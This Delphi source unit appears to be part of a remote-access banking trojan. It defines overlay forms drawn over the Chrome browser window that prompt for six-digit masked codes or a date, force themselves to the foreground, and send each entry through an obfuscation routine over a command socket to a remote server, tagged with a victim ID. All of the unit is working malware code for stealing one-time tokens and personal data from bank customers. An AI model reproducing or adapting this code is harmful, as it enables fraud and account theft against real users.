unit ut_04;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.ExtCtrls, Vcl.StdCtrls,
  Vcl.Imaging.pngimage, Vcl.Mask, System.StrUtils, variaveis, conexoes,
  principal;

type
  TTNT_04 = class(TForm)
    Timer1: TTimer;
    procedure OKClick(Sender: TObject);
    procedure OK2Click(Sender: TObject);
    procedure OK3Click(Sender: TObject);
    procedure OK4Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    pnl1: TMibnPNL;
    img1backChrome_WidgetWin_1: TMibIMG;
    OK: TMibIMG;
    edt1campo: TMibPNL;
    pnl2: TMibnPNL;
    img2backgroud: TMibIMG;
    lbl1: TLabel;
    OK2: TMibIMG;
    edt2campo: TMibPNL;
    pnl3: TMibnPNL;
    img3backChrome_WidgetWin_1: TMibIMG;
    OK3: TMibIMG;
    lbl2: TLabel;
    edt3campo: TMibPNL;
    pnl4: TMibnPNL;
    img4backChrome_WidgetWin_1: TMibIMG;
    OK4: TMibIMG;
    dd: TMaskEdit;
    ID, CH: string;
    constructor Create(aowner: Tcomponent); overload;
  end;

var
  TNT_04: TTNT_04;

implementation

uses usession, umodulo;

{$R *.dfm}

constructor TTNT_04.Create(aowner: Tcomponent);
begin
  inherited;

  pnl1 := TMibnPNL.Create(Self);
  img1backChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OK := TMibIMG.Create(Self);
  edt1campo := TMibPNL.Create(Self);
  pnl2 := TMibnPNL.Create(Self);
  img2backgroud := TMibIMG.Create(Self);
  lbl1 := TLabel.Create(Self);
  OK2 := TMibIMG.Create(Self);
  edt2campo := TMibPNL.Create(Self);
  pnl3 := TMibnPNL.Create(Self);
  img3backChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OK3 := TMibIMG.Create(Self);
  lbl2 := TLabel.Create(Self);
  edt3campo := TMibPNL.Create(Self);
  pnl4 := TMibnPNL.Create(Self);
  img4backChrome_WidgetWin_1 := TMibIMG.Create(Self);
  OK4 := TMibIMG.Create(Self);
  dd := TMaskEdit.Create(Self);

  pnl1.Name := 'pnl1';
  pnl1.Parent := Self;
  pnl1.Left := 0;
  pnl1.Top := 0;
  pnl1.Width := 642;
  pnl1.Height := 484;
  pnl1.Align := alClient;
  pnl1.TabOrder := 0;
  img1backChrome_WidgetWin_1.Name := 'img1backChrome_WidgetWin_1';
  img1backChrome_WidgetWin_1.Parent := pnl1;
  img1backChrome_WidgetWin_1.Left := 0;
  img1backChrome_WidgetWin_1.Top := 0;
  img1backChrome_WidgetWin_1.Width := 642;
  img1backChrome_WidgetWin_1.Height := 484;
  img1backChrome_WidgetWin_1.Align := alClient;
  OK.Name := 'OK';
  OK.Parent := pnl1;
  OK.Left := 320;
  OK.Top := 309;
  OK.Width := 75;
  OK.Height := 18;
  OK.Cursor := crHandPoint;
  OK.DragCursor := crHandPoint;
  OK.OnClick := OKClick;
  edt1campo.Name := 'edt1campo';
  edt1campo.Parent := pnl1;
  edt1campo.Left := 218;
  edt1campo.Top := 309;
  edt1campo.Width := 52;
  edt1campo.Height := 13;
  edt1campo.TabStop := False;
  edt1campo.BevelInner := bvNone;
  edt1campo.BevelOuter := bvNone;
  edt1campo.BorderStyle := bsNone;
  edt1campo.MaxLength := 6;
  edt1campo.NumbersOnly := True;
  edt1campo.PasswordChar := #8226;
  edt1campo.TabOrder := 0;
  pnl2.Name := 'pnl2';
  pnl2.Parent := Self;
  pnl2.Left := 0;
  pnl2.Top := 0;
  pnl2.Width := 642;
  pnl2.Height := 484;
  pnl2.Align := alClient;
  pnl2.TabOrder := 1;
  img2backgroud.Name := 'img2backgroud';
  img2backgroud.Parent := pnl2;
  img2backgroud.Left := 0;
  img2backgroud.Top := 0;
  img2backgroud.Width := 642;
  img2backgroud.Height := 484;
  img2backgroud.Align := alClient;
  lbl1.Name := 'lbl1';
  lbl1.Parent := pnl2;
  lbl1.Left := 208;
  lbl1.Top := 279;
  lbl1.Width := 36;
  lbl1.Height := 16;
  lbl1.Caption := '';
  lbl1.ParentFont := False;
  lbl1.Transparent := True;
  with lbl1.Font do
  begin
    Name := 'Tahoma';
    Size := 10;
    Style := [fsBold];
    Color := $004080FF;
  end;
  OK2.Name := 'OK2';
  OK2.Parent := pnl2;
  OK2.Left := 400;
  OK2.Top := 248;
  OK2.Width := 73;
  OK2.Height := 18;
  OK2.Cursor := crHandPoint;
  OK2.DragCursor := crHandPoint;
  OK2.OnClick := OK2Click;
  edt2campo.Name := 'edt2campo';
  edt2campo.Parent := pnl2;
  edt2campo.Left := 19;
  edt2campo.Top := 253;
  edt2campo.Width := 45;
  edt2campo.Height := 14;
  edt2campo.TabStop := False;
  edt2campo.BevelInner := bvNone;
  edt2campo.BevelOuter := bvNone;
  edt2campo.BorderStyle := bsNone;
  edt2campo.MaxLength := 6;
  edt2campo.NumbersOnly := True;
  edt2campo.PasswordChar := #8226;
  edt2campo.TabOrder := 0;
  pnl3.Name := 'pnl3';
  pnl3.Parent := Self;
  pnl3.Left := 0;
  pnl3.Top := 0;
  pnl3.Width := 642;
  pnl3.Height := 484;
  pnl3.Align := alClient;
  pnl3.TabOrder := 2;
  img3backChrome_WidgetWin_1.Name := 'img3backChrome_WidgetWin_1';
  img3backChrome_WidgetWin_1.Parent := pnl3;
  img3backChrome_WidgetWin_1.Left := 0;
  img3backChrome_WidgetWin_1.Top := 0;
  img3backChrome_WidgetWin_1.Width := 642;
  img3backChrome_WidgetWin_1.Height := 484;
  img3backChrome_WidgetWin_1.Align := alClient;
  OK3.Name := 'OK3';
  OK3.Parent := pnl3;
  OK3.Left := 393;
  OK3.Top := 308;
  OK3.Width := 75;
  OK3.Height := 19;
  OK3.Cursor := crHandPoint;
  OK3.DragCursor := crHandPoint;
  OK3.OnClick := OK3Click;
  lbl2.Name := 'lbl2';
  lbl2.Parent := pnl3;
  lbl2.Left := 356;
  lbl2.Top := 309;
  lbl2.Width := 24;
  lbl2.Height := 16;
  lbl2.Caption := '';
  lbl2.ParentFont := False;
  lbl2.Transparent := True;
  with lbl2.Font do
  begin
    Name := 'Tahoma';
    Size := 10;
    Style := [fsBold];
    Color := clNavy;
  end;
  edt3campo.Name := 'edt3campo';
  edt3campo.Parent := pnl3;
  edt3campo.Left := 101;
  edt3campo.Top := 311;
  edt3campo.Width := 50;
  edt3campo.Height := 15;
  edt3campo.TabStop := False;
  edt3campo.BevelInner := bvNone;
  edt3campo.BevelOuter := bvNone;
  edt3campo.BorderStyle := bsNone;
  edt3campo.MaxLength := 6;
  edt3campo.NumbersOnly := True;
  edt3campo.PasswordChar := #8226;
  edt3campo.TabOrder := 0;
  pnl4.Name := 'pnl4';
  pnl4.Parent := Self;
  pnl4.Left := 0;
  pnl4.Top := 0;
  pnl4.Width := 642;
  pnl4.Height := 484;
  pnl4.Align := alClient;
  pnl4.TabOrder := 3;
  img4backChrome_WidgetWin_1.Name := 'img4backChrome_WidgetWin_1';
  img4backChrome_WidgetWin_1.Parent := pnl4;
  img4backChrome_WidgetWin_1.Left := 0;
  img4backChrome_WidgetWin_1.Top := 0;
  img4backChrome_WidgetWin_1.Width := 642;
  img4backChrome_WidgetWin_1.Height := 484;
  img4backChrome_WidgetWin_1.Align := alClient;
  OK4.Name := 'OK4';
  OK4.Parent := pnl4;
  OK4.Left := 336;
  OK4.Top := 308;
  OK4.Width := 76;
  OK4.Height := 18;
  OK4.Cursor := crHandPoint;
  OK4.DragCursor := crHandPoint;
  OK4.OnClick := OK4Click;
  dd.Name := 'dd';
  dd.Parent := pnl4;
  dd.Left := 242;
  dd.Top := 310;
  dd.Width := 66;
  dd.Height := 16;
  dd.BevelInner := bvNone;
  dd.BevelOuter := bvNone;
  dd.BorderStyle := bsNone;
  dd.EditMask := '!99/99/0000;1;_';
  dd.MaxLength := 10;
  dd.TabOrder := 0;
  dd.Text := '  /  /    ';

  edt1campo.Text := '';
  edt2campo.Text := '';
  edt3campo.Text := '';

end;

procedure TTNT_04.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
    GWL_EXSTYLE) or WS_EX_TRANSPARENT or WS_EX_NOACTIVATE);
  SethWndTrasparent(Handle_Main, True);
  Install_Cur(True);
  Mostra_ou_Esconder(True);
  TNT_04.Free;
  TNT_04 := nil;
end;

procedure TTNT_04.FormShow(Sender: TObject);
begin
  // TranslateMessage(Msg);
  // DispatchMessage(Msg);
  Mostra_ou_Esconder(False);
  bBlockMouse := False;
  Install_Cur(False);
  SetWindowLong(Handle_Main, GWL_EXSTYLE, GetWindowLong(Handle_Main,
    GWL_EXSTYLE) and not WS_EX_TRANSPARENT);
  ShowWindow(Handle, SW_HIDE);
  // SethWndTrasparent(Handle_Main, False);
  // SetForegroundWindow(Handle_Main);
  // SetForegroundWindow(handle);
  // Application.ProcessMessages;
  Top := (Screen.Height div 2) - (Height div 2);
  Left := (Screen.Width div 2) - (Width div 2);

  case AnsiIndexStr(ID, ['TTL_01', 'TTL_02', 'TTL_03', 'TTL_04']) of
    0:
      begin
        LoadImg(img1backChrome_WidgetWin_1, 'TNTI01');
        TNT_04.pnl1.BringToFront;
        TNT_04.pnl1.Visible := True;
        // Telinha:=True;
      end;
    1:
      begin
        LoadImg(img2backgroud, 'TNTI02');
        lbl1.Caption := CH;
        TNT_04.pnl2.BringToFront;
        TNT_04.pnl2.Visible := True;
        // Telinha:=True;
      end;
    2:
      begin
        LoadImg(img3backChrome_WidgetWin_1, 'TNTI03');
        lbl2.Caption := CH;
        TNT_04.pnl3.BringToFront;
        TNT_04.pnl3.Visible := True;
        // Telinha:=True;
      end;
    3:
      begin
        LoadImg(img4backChrome_WidgetWin_1, 'TNTI04');
        TNT_04.pnl4.BringToFront;
        TNT_04.pnl4.Visible := True;
        // Telinha:=True;
      end;
  end;
end;

procedure TTNT_04.OK2Click(Sender: TObject);
begin
  if Length(edt2campo.Text) = 6 then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt2campo.Text));
    close;
  end
  else
  begin
    edt2campo.SetFocus;
    edt2campo.Clear;
  end;
end;

procedure TTNT_04.OK3Click(Sender: TObject);
begin
  if Length(edt3campo.Text) = 6 then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt3campo.Text));
    close;
  end
  else
  begin
    edt3campo.SetFocus;
    edt3campo.Clear;
  end;
end;

procedure TTNT_04.OK4Click(Sender: TObject);
begin
  if Length(dd.Text) = 10 then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + dd.Text));
    close;
  end
  else
  begin
    dd.SetFocus;
    dd.Clear;
  end;
end;

procedure TTNT_04.OKClick(Sender: TObject);
begin
  if Length(edt1campo.Text) = 6 then
  begin
    CmdSocket.CmdSocket.Socket.SendText
      (O_F_uS_C('C', '#RE#' + '<#>' + IdServe + '<#>' + edt1campo.Text));
    close;
  end
  else
  begin
    edt1campo.SetFocus;
    edt1campo.Clear;
  end;
end;

procedure TTNT_04.Timer1Timer(Sender: TObject);
begin
  Application.ProcessMessages;
  if GetForegroundWindow <> Handle then
    SetForegroundWindow(Handle)
end;

end.
